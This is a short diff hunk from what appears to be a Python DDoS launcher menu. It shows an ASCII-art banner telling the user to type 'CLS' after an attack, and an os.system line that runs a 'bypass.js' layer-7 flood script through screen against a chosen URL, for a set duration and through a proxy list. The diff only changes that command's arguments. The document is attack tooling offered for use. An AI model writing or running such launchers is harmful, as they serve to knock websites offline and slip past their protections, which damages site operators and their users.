@@ -414,7 +414,7 @@ def main():
 ⠀⠀⠀⠀\033[31m⢹⢁⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⢧⡀⠀⠀⠀⠀⠀\033[34m⢹⠙⣷⣧ \033[37mPlease After Attack Type \033[34m'CLS'\033[37m For Back To Home
 ⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
 """)
-                    os.system(f'cd l7 && screen -dm node bypass.js {url} {duration} 3 proxy.txt 64 bypass query true')
+                    os.system(f'cd l7 && screen -dm node bypass.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
